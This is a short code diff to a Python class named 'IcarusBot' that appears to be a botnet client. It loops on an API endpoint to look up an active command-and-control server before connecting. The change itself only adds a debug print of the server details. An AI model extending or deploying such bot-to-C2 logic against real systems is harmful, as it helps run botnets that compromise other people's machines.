@@ -51,6 +51,7 @@ class IcarusBot:
             nameserver_available = False
             while not nameserver_available:
                 self.c2_server_details = tuple(requests.get(f'{API_URL}/api/lookup/c2').text.split("::"))
+                print(self.c2_server_details)
                 if self.c2_server_details[0] != 'not_active' and self.c2_server_details[1] != 'not_active':
                     # there is a server available, let's go ahead and connect, ignoring the nameserver again until they disconnect.
                     nameserver_available = True
